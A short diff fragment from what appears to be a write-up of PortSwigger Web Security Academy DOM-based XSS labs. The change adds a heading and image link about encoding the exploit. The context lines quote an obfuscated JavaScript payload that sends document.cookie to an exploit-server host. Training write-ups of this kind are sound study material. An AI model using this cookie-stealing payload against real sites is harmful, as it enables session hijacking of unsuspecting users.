@@ -21,6 +21,8 @@ location='https://<CHANGE-HERE>.web-security-academy.net/?SearchTerm="-(window["
 ```js
 "-(window["document"]["location"]="https://exploit-0af4008003a936d2c1563c1001a30084%2eexploit-server%2enet/?"+window["document"]["cookie"])-"
 ```
+## ENCODE the exploit:
+![](https://github.com/nu11secur1ty/PortSwigger-Web-Security-Academy/blob/main/Burp-Suite-Certified-Practitioner/docs/XSS-DOM-Procedure/Encode.png)
 
 ## THE ACTUAL EXPLOIT:
 ```js
